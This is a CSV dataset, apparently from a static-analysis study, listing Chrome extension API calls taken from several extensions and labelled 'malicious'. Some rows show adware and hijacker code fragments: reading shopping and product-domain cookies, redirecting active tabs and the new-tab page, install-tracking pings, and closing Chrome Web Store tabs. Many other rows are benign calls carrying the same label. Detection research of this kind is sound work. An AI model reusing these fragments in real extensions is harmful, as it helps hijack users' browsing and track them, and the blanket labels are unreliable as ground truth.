col0,col1,col2,col3,db_type,query_name,extracted_code_block
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... .tabId),malicious,chrome,chrome.tabs.remove(t.data.tabId)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.tabs.remove,chrome. ... move(r),malicious,chrome,chrome.tabs.remove(r)
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js,7,chrome.cookies.get,chrome. ... lue)})),malicious,chrome,"chrome.cookies.get({url:""https://shoppingcart.aliexpress.com/"",name:""xman_us_f""},(e=>{i(e.value)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... n(e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:e,data:t},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void n(null);n(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... t(e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:e},(async e=>{if(chrome.runtime.lastError)return console.log(""Messaging error"",chrome.runtime.lastError),void t(null);t(e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... e(t)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_GET_ORDER_CURRENCY"",data:{params:n}},(t=>{e(t)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... 0:e)})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_GET_EXCHANGE_RATE"",data:{currency:e}},(e=>{o(null===e?void 0:e)}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.sendMessage,chrome. ... cmd:s}),malicious,chrome,chrome.runtime.sendMessage({cmd:s})
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/content.00261377.js,70,chrome.runtime.getURL,"chrome. ... o.png"")",malicious,chrome,"chrome.runtime.getURL(""assets/img/ali_compare_logo.png"")"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... )}))})),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_OPEN_SHEIN_AFF""},(r=>{r?.affTab?.id&&window.addEventListener(""storage"",(a=>{a.key===e&&t()&&chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})}))}))"
HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/contentShein.41183e58.js,1,chrome.runtime.sendMessage,chrome. ... b.id}}),malicious,chrome,"chrome.runtime.sendMessage({cmd:""CMD_CLOSE_SHEIN_AFF"",data:{tabId:r.affTab.id}})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,18,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: ""chrome://newtab"" })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,25,chrome.tabs.getSelected,chrome. ... );\n  }),malicious,chrome,"chrome.tabs.getSelected(null, function(tab) { chrome.tabs.update(tab.id, {url: url}); })"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,26,chrome.tabs.update,chrome. ... : url}),malicious,chrome,"chrome.tabs.update(tab.id, {url: url})"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,60,chrome.tabs.remove,chrome. ... esolve),malicious,chrome,"chrome.tabs.remove(tabIdsToRemove, resolve)"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,68,chrome.tabs.create,"chrome. ... ue }, )",malicious,chrome,"chrome.tabs.create({ url: 'https://ddksearch.com/thankyou.php', active: true }, )"
JS-SEARCH-noUI-SURL-gjnlgmpokfpkonbdfkjbihmliofkjeok.1_0_6_0/src/js/background.js,70,chrome.runtime.setUninstallURL,chrome. ... .html'),malicious,chrome,chrome.runtime.setUninstallURL('https://ddksearch.com/uninstalled.html')
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/background/runtime.js,3,chrome.tabs.create,chrome. ... b'\n  }),malicious,chrome,chrome.tabs.create({ url: 'chrome://newtab' })
JS-SEARCH-ompmbcpalofeaelpfohpmpmjhjahgpbp.1_0_2_0/src/static/js/script.js,1,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,22,chrome.tabs.query,chrome. ... \n    }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) { if (!tabs || !tabs[0]) return; callback(tabs[0]); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,79,chrome.cookies.getAll,chrome. ... \n    }),malicious,chrome,"chrome.cookies.getAll({ domain: extSettings.ProductDomain }, function (cookies) { for (let i = 0; i < cookies.length; i++) { if (cookies[i].name.indexOf('trcrx_') != -1) { const cookieName = cookies[i].name.split('trcrx_')[1]; setSetting(cookieName, cookies[i].value, cookieName === 'guid'); } } if (callback) callback(); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,91,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,"chrome.tabs.create({ url: tabURL, active: isActive })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,115,chrome.tabs.query,chrome. ... \n    }),malicious,chrome,"chrome.tabs.query({ url: '*://chrome.google.com/webstore/*' }, function (tabs) { for (tab of tabs) { if (tab.id && tab.url.includes(getSetting('extId'))) { if (cwsUrl) { chrome.tabs.update(tab.id, { url: cwsUrl }); chrome.windows.update(tab.windowId, { focused: true }); } else if (extSettings[TY_COOKIE_NAME]) { chrome.tabs.remove(tab.id); } } } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,119,chrome.tabs.update,chrome. ... sUrl }),malicious,chrome,"chrome.tabs.update(tab.id, { url: cwsUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,122,chrome.tabs.remove,chrome. ... tab.id),malicious,chrome,chrome.tabs.remove(tab.id)
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,129,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ url: `${ getSetting('location') }*` }, function (tab) { if (tab && tab[0] && tab[0].id) { chrome.tabs.update(tab[0].id, { url: lpUrl }); } })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,131,chrome.tabs.update,chrome. ... pUrl }),malicious,chrome,"chrome.tabs.update(tab[0].id, { url: lpUrl })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js,137,chrome.tabs.update,chrome. ...      }),malicious,chrome,"chrome.tabs.update(activeTab.id, { url: lpUrl }, function (tab) { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,7,chrome.tabs.update,chrome. ... rl() }),malicious,chrome,"chrome.tabs.update(activeTab.id, { url: getNTUrl() })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,33,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/listeners.js,36,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/omni.js,18,chrome.tabs.update,chrome. ...  url }),malicious,chrome,"chrome.tabs.update(tab.id, { url })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,6,chrome.management.getSelf,chrome. ...      }),malicious,chrome,"chrome.management.getSelf(function (extInfo) { setSetting('extId', extInfo.id); setSetting('extVersion', extInfo.version); const src = `https://ext.${ extSettings.ProductDomain }/api/v1/px/install?` + `&eType=${ extSettings.EType }&ext.yid=${ extSettings.ProductId }&ext.id=${ extInfo.id }&ext.version=${ extInfo.version }`; addBGImg(src, function () { getCookies(function () { ping(); firstRunPage(); }); }); })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/startup.js,49,chrome.runtime.setUninstallURL,chrome. ... \n    }),malicious,chrome,"chrome.runtime.setUninstallURL(uninstallUrl, function () { })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/options.js,1,chrome.runtime.sendMessage,chrome. ... url;\n}),malicious,chrome,"chrome.runtime.sendMessage({ task: ""getOptionsRedirectUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/options/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/popup.js,5,chrome.runtime.sendMessage,chrome. ... \n    }),malicious,chrome,"chrome.runtime.sendMessage({ task: ""getPopUpUrl"" }, function(res) { document.querySelector(""#frame"").src = res.url; })"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,5,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: event.data.name, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,16,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: event.data.name, value: event.data.value, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,28,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: event.data.msg, obj: event.data.obj, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/popup/tabContent.js,39,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""openUrl"", obj: event.data, }, function(res) { returnMessage(res); } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,1,chrome.runtime.getURL,"chrome. ... w.png"")",malicious,chrome,"chrome.runtime.getURL(""prompt/green-up-arrow.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,2,chrome.runtime.getURL,"chrome. ... e.png"")",malicious,chrome,"chrome.runtime.getURL(""prompt/ok-green-square.png"")"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,108,chrome.runtime.sendMessage,chrome. ... }\n    ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""getSetting"", name: ""firstSearchMade"", }, function(res) { if (res) { const hidePrompt = function() { document.querySelector(""#arrow-modal"").innerHTML = """"; document.body.onclick = null; };  const styles = document.createTextNode(promptCSS); const promptStyles = document.createElement(""STYLE""); promptStyles.appendChild(styles); document.querySelector(""body"").appendChild(promptStyles);  const promptDiv = document.createElement(""div""); promptDiv.innerHTML = promptHTML; document.querySelector(""body"").appendChild(promptDiv);  document.body.onclick = function() { hidePrompt(); }; setTimeout(hidePrompt, 5000);  chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} ); } } )"
REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/prompt/prompt.js,134,chrome.runtime.sendMessage,chrome. ...       ),malicious,chrome,"chrome.runtime.sendMessage( { task: ""setSetting"", name: ""firstSearchMade"", value: false, }, function() {} )"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,675,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,781,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,878,chrome.runtime.getManifest,chrome. ... ifest(),malicious,chrome,chrome.runtime.getManifest()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7108,chrome.tabs.create,chrome. ... ')\n  }),malicious,chrome,"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/users/home') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7118,chrome.tabs.create,chrome. ... ')\n  }),malicious,chrome,"chrome.tabs.create({ url: Startme[""a"" /* default */].apiURL('/bookmarks?section=inbox') })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7131,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: chrome.runtime.getURL('welcome.html') })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7132,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('welcome.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7136,chrome.tabs.sendMessage,chrome. ...      }),malicious,chrome,"chrome.tabs.sendMessage(tab.id, { message: SM_MESSAGE_SHOW_WELCOME })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7194,chrome.runtime.setUninstallURL,chrome. ... WSER))),malicious,chrome,"chrome.runtime.setUninstallURL(Startme[""a"" /* default */].primaryURL(""/chrome_uninstall.html?browser="".concat(WINDOW_CURRENT_BROWSER)))"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7448,chrome.tabs.query,chrome. ... ue\n  }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7455,chrome.tabs.update,chrome. ... \n    }),malicious,chrome,"chrome.tabs.update(tabs[0].id, { url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7580,chrome.tabs.create,chrome. ...      }),malicious,chrome,"chrome.tabs.create({ url: request.url, active: !!request.active })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7585,chrome.tabs.update,chrome. ...      }),malicious,chrome,chrome.tabs.update({ url: request.url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7666,chrome.tabs.query,chrome. ... ue\n  }),malicious,chrome,"chrome.tabs.query({ active: true, currentWindow: true })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7672,chrome.tabs.sendMessage,chrome. ... \n    }),malicious,chrome,"chrome.tabs.sendMessage(tabId, { message: SM_MESSAGE_CHECK_IFRAME_SRC, homepageUrl: homepageUrl, url: url })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7721,chrome.tabs.create,chrome. ... e'\n  }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7731,chrome.tabs.create,chrome. ... e'\n  }),malicious,chrome,chrome.tabs.create({ url: 'https://support.start.me/hc/en-us/articles/360017846280-Extension-New-tab-page-by-start-me' })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,7741,chrome.runtime.openOptionsPage,chrome. ... sPage(),malicious,chrome,chrome.runtime.openOptionsPage()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8130,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('popup.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8189,chrome.runtime.getURL,chrome. ... .html'),malicious,chrome,chrome.runtime.getURL('import.html')
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8195,chrome.tabs.remove,chrome. ... tTabId),malicious,chrome,chrome.tabs.remove(importTabId)
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8198,chrome.tabs.create,chrome. ...      }),malicious,chrome,chrome.tabs.create({ url: importedPageUrl })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8218,chrome.bookmarks.getTree,chrome. ... tTree(),malicious,chrome,chrome.bookmarks.getTree()
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8349,chrome.tabs.create,chrome. ... \n    }),malicious,chrome,chrome.tabs.create({ url: url })
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js,8412,chrome.tabs.query,chrome. ...      }),malicious,chrome,"chrome.tabs.query({ windowId: window.id, index: 0 })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,275,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_SIGN_IN }, function (success) { if (!success) return reject(); // Wait for signal 'signed in'  chrome.runtime.onMessage.addListener(function (message) { if (message.message == SM_MESSAGE_SIGNED_IN) { // Make sure user is signed in _this2.getUser(true /* No caching */ ).then(resolve).catch(reject); } }); })"
taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/chunk-common.d3333ef8.js,381,chrome.runtime.sendMessage,chrome. ...      }),malicious,chrome,"chrome.runtime.sendMessage({ message: SM_MESSAGE_OPEN_OPTIONS_PAGE }, function (response) { if (response === true) resolve();else reject(); })"
